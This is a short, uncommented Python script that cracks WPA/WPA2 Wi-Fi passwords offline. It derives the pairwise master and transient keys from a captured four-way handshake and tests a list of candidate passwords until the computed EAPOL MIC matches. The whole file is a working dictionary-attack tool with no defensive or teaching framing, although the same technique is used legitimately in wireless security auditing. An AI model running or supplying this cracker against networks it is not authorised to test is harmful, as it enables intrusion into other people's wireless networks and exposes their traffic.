#!/usr/bin/env python3
from __future__ import annotations

import hashlib
import hmac


def derive_pmk(password: str, ssid: str) -> bytes:
    return hashlib.pbkdf2_hmac("sha1", password.encode(), ssid.encode(), 4096, 32)


def custom_prf512(key: bytes, label: bytes, context: bytes) -> bytes:
    output = b""
    counter = 0
    while len(output) < 64:
        output += hmac.new(key, label + b"\x00" + context + bytes([counter]), hashlib.sha1).digest()
        counter += 1
    return output[:64]


def build_context(record: dict[str, str]) -> bytes:
    macs = sorted(bytes.fromhex(record[key]) for key in ("ap_mac", "client_mac"))
    nonces = sorted(bytes.fromhex(record[key]) for key in ("anonce", "snonce"))
    return b"".join(macs + nonces)


def candidate_mic(password: str, record: dict[str, str]) -> bytes:
    pmk = derive_pmk(password, record["ssid"])
    ptk = custom_prf512(pmk, b"Pairwise key expansion", build_context(record))
    return hmac.new(ptk[:16], bytes.fromhex(record["eapol"]), hashlib.sha1).digest()[:16]


def crack_capture(record: dict[str, str], candidates: list[str]) -> str | None:
    expected = bytes.fromhex(record["mic"])
    for candidate in candidates:
        if hmac.compare_digest(candidate_mic(candidate, record), expected):
            return candidate
    return None
